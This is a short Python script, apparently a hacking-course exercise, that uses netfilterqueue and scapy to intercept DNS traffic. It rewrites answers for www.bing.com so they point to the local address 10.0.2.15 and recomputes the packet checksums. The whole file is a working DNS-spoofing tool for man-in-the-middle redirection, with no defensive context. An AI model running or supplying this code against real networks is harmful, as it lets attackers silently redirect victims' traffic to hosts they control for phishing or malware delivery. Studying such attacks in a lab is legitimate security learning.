#!/user/bin/env python

import netfilterqueue
import scapy.all as scapy

def queue_process(packet):
    scapy_packet=scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname=scapy_packet[scapy.DNSQR].qname
        if (qname == 'www.bing.com.'):
            print(scapy_packet.show())
            ans=scapy.DNSRR(rrname=qname,rdata='10.0.2.15')
            scapy_packet[scapy.DNS].an=ans
            scapy_packet[scapy.DNS].ancount=1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            packet.set_payload(str(scapy_packet))


    packet.accept()



queue=netfilterqueue.NetfilterQueue()
queue.bind(0,queue_process)
queue.run()